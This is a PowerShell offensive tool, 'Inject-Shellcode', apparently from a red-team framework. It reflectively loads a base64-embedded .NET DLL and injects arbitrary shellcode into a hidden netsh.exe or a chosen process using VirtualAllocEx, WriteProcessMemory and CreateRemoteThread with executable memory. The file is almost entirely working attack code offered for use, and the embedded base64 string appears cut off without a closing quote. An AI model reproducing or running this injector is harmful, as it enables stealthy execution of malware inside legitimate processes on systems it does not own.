function Inject-Shellcode ([switch]$x86, [switch]$x64, [Parameter(Mandatory=$true)]$Shellcode, $ProcID, $ProcessPath)
{
<#
.SYNOPSIS
Inject-Shellcode

Author: @benpturner
 
.DESCRIPTION
Injects shellcode into x86 or x64 bit processes. Tested on Windowns 7 32 bit, Windows 7 64 bit and Windows 10 64bit.

.EXAMPLE
Inject-Shellcode -x86 -Shellcode (GC C:\Temp\Shellcode.bin -Encoding byte)

.EXAMPLE
Inject-Shellcode -x86 -Shellcode (GC C:\Temp\Shellcode.bin -Encoding byte) -ProcID 5634

.EXAMPLE
Inject-Shellcode -x86 -Shellcode (GC C:\Temp\Shellcode.bin -Encoding byte) -ProcessPath C:\Windows\System32\notepad.exe

#>
  $p = "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
  $dl  = [System.Convert]::FromBase64String($p)
  $a = [System.Reflection.Assembly]::Load($dl)
  $o = New-Object Inject
  $pst = New-Object System.Diagnostics.ProcessStartInfo
  $pst.UseShellExecute = $False
  $pst.CreateNoWindow = $True
  $pst.FileName = "C:\Windows\system32\netsh.exe"
  if ($x86.IsPresent) {
    $pst.FileName = "C:\Windows\Syswow64\netsh.exe"
  } 
  if ($ProcessPath) {
    $pst.FileName = "$ProcessPath"
  } 
  if ($ProcID){
    $Process = [System.Diagnostics.Process]::GetProcessById($ProcID)
  } else {
    $Process = [System.Diagnostics.Process]::Start($pst)
  }
  [IntPtr]$phandle = $Process.Handle
  [IntPtr]$zz = 0x10000
  [IntPtr]$x = 0
  [IntPtr]$nul = 0
  [IntPtr]$max = 0x70000000
  while( $zz.ToInt32() -lt $max.ToInt32() )
  {
    $x=[Inject]::VirtualAllocEx($phandle,$zz,$Shellcode.Length*2,0x3000,0x40)
    if( $x.ToInt32() -ne $nul.ToInt32() ){ break }
    $zz = [Int32]$zz + $Shellcode.Length
  }
  if( $x.ToInt32() -gt $nul.ToInt32() )
  {
    $hg = [Runtime.InteropServices.Marshal]::AllocHGlobal($Shellcode.Length)
    [Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $hg, $Shellcode.Length)|Out-Null
    [Inject]::WriteProcessMemory($phandle,[IntPtr]($x.ToInt32()),$hg, $Shellcode.Length,0)|Out-Null
    [Inject]::CreateRemoteThread($phandle,0,0,[IntPtr]$x,0,0,0)|Out-Null
  }

}
